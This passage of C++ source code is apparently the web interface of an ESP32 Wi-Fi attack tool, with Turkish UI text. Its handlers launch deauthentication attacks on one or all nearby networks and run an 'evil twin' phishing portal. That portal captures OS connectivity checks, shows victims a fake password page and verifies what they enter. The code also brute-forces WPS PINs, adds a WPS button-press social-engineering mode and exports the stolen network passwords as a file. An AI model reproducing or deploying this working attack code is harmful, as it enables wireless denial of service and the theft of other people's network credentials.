    "h2{color:#f0f6fc;font-size:1.1em;margin-bottom:8px}"
    "p{color:#8b949e;font-size:.82em;line-height:1.5}"
    "</style></head><body>"
    "<div class='box'><div class='spin'></div>"
    "<h2>Sifre Dogrulaniyor</h2>"
    "<p>Gercek aga baglaniliyor,<br>lutfen bekleyin...</p>"
    "</div></body></html>"));
  // ← handler burada döner; TCP flush olur; tarayıcı sayfayı görür
}

static void handle_test_result() {
  if (!et_result_ready) {
    // Test henuz bitmedi — 3 saniye sonra tekrar kontrol et
    String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<meta http-equiv='refresh' content='3; url=/test_result'>"
      "<title>Bekleniyor...</title>"
      "<style>"
      "body{font-family:'Segoe UI',sans-serif;background:#0d1117;"
      "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
      ".box{background:#161b22;border:1px solid #30363d;border-radius:14px;"
      "padding:36px 28px;max-width:320px;text-align:center}"
      ".spin{width:44px;height:44px;border:4px solid #30363d;"
      "border-top-color:#58a6ff;border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}"
      "@keyframes s{to{transform:rotate(360deg)}}"
      "h2{color:#f0f6fc;font-size:1.1em;margin-bottom:8px}"
      "p{color:#8b949e;font-size:.82em}"
      "</style></head><body>"
      "<div class='box'><div class='spin'></div>"
      "<h2>Test Devam Ediyor</h2>"
      "<p>Lutfen bekleyin...</p>"
      "</div></body></html>");
    server.send(200, "text/html", html);
    return;
  }

  if (et_result_correct) {
    String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<title>Baglandi</title>"
      "<style>"
      "body{font-family:'Segoe UI',sans-serif;background:#0d1117;"
      "display:flex;align-items:center;justify-content:center;height:100vh;margin:0}"
      ".box{background:#0d2818;border:1px solid #3fb950;border-radius:14px;"
      "padding:36px 28px;max-width:320px;text-align:center}"
      "h2{color:#3fb950;margin-bottom:10px;font-size:1.2em}"
      "p{color:#8b949e;font-size:.85em;line-height:1.5}"
      "</style></head><body>"
      "<div class='box'>&#9989;"
      "<h2>Baglanti Basarili!</h2>"
      "<p>Ag kimlik bilgileri dogrulandi.<br>Baglaniliyor...</p>"
      "</div></body></html>");
    server.send(200, "text/html", html);
  } else {
    server.sendHeader("Location", "/portal_wrong");
    server.send(302);
  }
}

// Captive portal detection — tüm OS'leri yakala
static void handle_captive_redirect() {
  if (evil_twin_active) {
    server.sendHeader("Location", "http://192.168.4.1/portal");
    server.send(302);
  } else {
    redirect_root();
  }
}

// Android captive portal check (204 bekleniyor, biz redirect yapıyoruz)
static void handle_generate_204() {
  if (evil_twin_active) {
    server.sendHeader("Location", "http://192.168.4.1/portal");
    server.send(302);
  } else {
    server.send(204);
  }
}

// ─── Deauth / Stop handler'lar ────────────────────────────────────────────────

static void handle_deauth() {
  int wifi_number = server.arg("net_num").toInt();
  uint16_t reason = server.arg("reason").toInt();

  String result;
  if (wifi_number < num_networks) {
    start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason);
    result = "<div class='alert-ok'>&#9889; Deauth basladi: <b>" + WiFi.SSID(wifi_number) +
             "</b> &mdash; Neden: " + String(reason) + "</div>";
  } else {
    result = F("<div class='alert-err'>&#10060; Gecersiz ag numarasi. Once tarayin.</div>");
  }

  String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sonuc</title><style>");
  html += FPSTR(CSS);
  html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>");
  html += result;
  html += F("<hr><a href='/' style='color:#58a6ff;font-size:.9em'>&#8592; Ana Sayfa</a>"
            "</div></div></body></html>");
  server.send(200, "text/html", html);
}

static void handle_deauth_all() {
  uint16_t reason = server.arg("reason").toInt();

  String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Tum Aglar</title><style>");
  html += FPSTR(CSS);
  html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>"
    "<div class='alert-err'>&#128165; Tum aglara saldiri basladi! Durdurmak icin ESP32 resetleyin.</div>"
    "</div></div></body></html>");
  server.send(200, "text/html", html);
  server.stop();
  start_deauth(0, DEAUTH_TYPE_ALL, reason);
}

static void handle_rescan() {
  num_networks = WiFi.scanNetworks();
  redirect_root();
}

static void handle_stop() {
  stop_deauth();
  redirect_root();
}

static void handle_evil_twin() {
  int wifi_number = server.arg("net_num").toInt();
  if (wifi_number < num_networks) {
    if (WiFi.encryptionType(wifi_number) == WIFI_AUTH_OPEN) {
      String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Uyari</title><style>");
      html += FPSTR(CSS);
      html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>"
        "<div class='alert-err'>&#9888; Bu ag sifresiz (OPEN). Evil Twin saldirisina gerek yok, sifre yakalanamaz.</div>"
        "<hr><a href='/' style='color:#58a6ff;font-size:.9em'>&#8592; Ana Sayfa</a>"
        "</div></div></body></html>");
      server.send(200, "text/html", html);
      return;
    }
    start_evil_twin(wifi_number);
    server.sendHeader("Location", "/");
    server.send(302);
  } else {
    String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Hata</title><style>");
    html += FPSTR(CSS);
    html += F("</style></head><body><div style='max-width:500px;margin:50px auto'><div class='card'>"
      "<div class='alert-err'>&#10060; Gecersiz ag numarasi. Once aglari tarayin.</div>"
      "<hr><a href='/' style='color:#58a6ff;font-size:.9em'>&#8592; Ana Sayfa</a>"
      "</div></div></body></html>");
    server.send(200, "text/html", html);
  }
}

static void handle_stop_evil_twin() {
  stop_evil_twin();
  redirect_root();
}

static void handle_delete_pw() {
  int idx = server.arg("idx").toInt();
  passwords_delete(idx);
  redirect_root();
}

static void handle_clear_pw() {
  passwords_clear_all();
  redirect_root();
}

// ─── WPS Gerçek Zamanlı Durum (AJAX JSON) ────────────────────────────────────
static void handle_wps_status() {
  char macStr[20];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
    wps_current_mac[0], wps_current_mac[1], wps_current_mac[2],
    wps_current_mac[3], wps_current_mac[4], wps_current_mac[5]);

  const char *stateStr = "idle";
  switch (wps_attack_state) {
    case WPS_ATTACKING:   stateStr = "attacking";  break;
    case WPS_LOCKED_OUT:  stateStr = "locked";     break;
    case WPS_SUCCESS:     stateStr = "success";    break;
    case WPS_EXHAUSTED:   stateStr = "exhausted";  break;
    case WPS_STOPPED:     stateStr = "stopped";    break;
    case WPS_SCANNING:    stateStr = "scanning";   break;
    default:              stateStr = "idle";       break;
  }

  String json = "{";
  json += "\"state\":\"" + String(stateStr) + "\",";
  json += "\"attempt\":" + String(wps_attempt) + ",";
  json += "\"total\":" + String(wps_total) + ",";
  json += "\"pin\":\"" + String(wps_current_pin) + "\",";
  json += "\"vendor\":\"" + String(wps_vendor_name) + "\",";
  json += "\"mac\":\"" + String(macStr) + "\",";
  json += "\"lockout\":" + String(wps_lockout_count) + ",";
  json += "\"found_pin\":\"" + String(wps_found_pin) + "\",";
  json += "\"found_ssid\":\"" + String(wps_found_ssid) + "\",";
  json += "\"found_pass\":\"" + String(wps_found_pass) + "\"";
  json += "}";

  server.sendHeader("Cache-Control", "no-cache");
  server.send(200, "application/json", json);
}

// ─── WPS PIN Saldırısı Handler'ları ──────────────────────────────────────────

static void handle_wps_scan() {
  if (evil_twin_active) { redirect_root(); return; }
  if (wps_attack_state == WPS_ATTACKING) { redirect_root(); return; }
  wps_scan();
  redirect_root();
}

static void handle_wps_attack() {
  if (evil_twin_active) { redirect_root(); return; }
  if (wps_attack_state == WPS_ATTACKING) { redirect_root(); return; }
  int idx = server.arg("target_idx").toInt();
  wps_start_attack(idx);
  redirect_root();
}

static void handle_wps_stop() {
  wps_stop();   // AP restore wps_stop() içinde yapılıyor
  redirect_root();
}

static void handle_export_pw() {
  int count = passwords_count();
  String txt = "ESP32-Deauther - Yakalanan Sifreler\n";
  txt += "====================================\n";
  if (count == 0) {
    txt += "(Henuz kayitli sifre yok)\n";
  } else {
    for (int i = 0; i < count; i++) {
      SavedPassword sp = passwords_get(i);
      txt += String(i + 1) + ". SSID: " + sp.ssid + " | Sifre: " + sp.password + "\n";
    }
  }
  server.sendHeader("Content-Disposition", "attachment; filename=sifreler.txt");
  server.send(200, "text/plain; charset=utf-8", txt);
}

// ─── Başlatma ─────────────────────────────────────────────────────────────────

void start_web_interface() {
  // Yönetim sayfaları
  server.on("/",               HTTP_GET,  handle_root);
  server.on("/rescan",         HTTP_POST, handle_rescan);
  server.on("/deauth",         HTTP_POST, handle_deauth);
  server.on("/deauth_all",     HTTP_POST, handle_deauth_all);
  server.on("/stop",           HTTP_POST, handle_stop);
  server.on("/evil_twin",      HTTP_POST, handle_evil_twin);
  server.on("/stop_evil_twin", HTTP_POST, handle_stop_evil_twin);
  server.on("/delete_pw",      HTTP_POST, handle_delete_pw);
  server.on("/clear_pw",       HTTP_POST, handle_clear_pw);
  server.on("/export_pw",      HTTP_GET,  handle_export_pw);

  // WPS PIN brute force
  server.on("/wps_scan",   HTTP_POST, handle_wps_scan);
  server.on("/wps_attack", HTTP_POST, handle_wps_attack);
  server.on("/wps_stop",   HTTP_POST, handle_wps_stop);
  server.on("/wps_status", HTTP_GET,  handle_wps_status);

  // Captive portal — kurban sayfaları
  server.on("/portal",         HTTP_GET,  handle_portal);
  server.on("/portal_wrong",   HTTP_GET,  handle_portal_wrong);
  server.on("/portal_manual",  HTTP_GET,  handle_portal_manual);
  server.on("/submit",         HTTP_POST, handle_submit);
  server.on("/test_result",    HTTP_GET,  handle_test_result);

  // WPS PBC sosyal mühendislik
  server.on("/wps_pbc_start",  HTTP_POST, handle_wps_pbc_start);
  server.on("/wps_pbc_stop",   HTTP_POST, handle_wps_pbc_stop);

  // OS captive portal detection URL'leri
  server.on("/generate_204",        handle_generate_204);
  server.on("/gen_204",             handle_generate_204);
  server.on("/hotspot-detect.html", handle_captive_redirect);  // iOS/macOS
  server.on("/ncsi.txt",            handle_captive_redirect);  // Windows
  server.on("/connecttest.txt",     handle_captive_redirect);  // Windows
  server.on("/canonical.html",      handle_captive_redirect);  // Firefox
  server.on("/success.txt",         handle_captive_redirect);
  server.on("/redirect",            handle_captive_redirect);

  // User-Agent başlığını topla — portal OS tespiti için
  static const char *hdrs[] = {"User-Agent"};
  server.collectHeaders(hdrs, 1);

  server.begin();
}

void web_interface_handle_client() {
  server.handleClient();
}
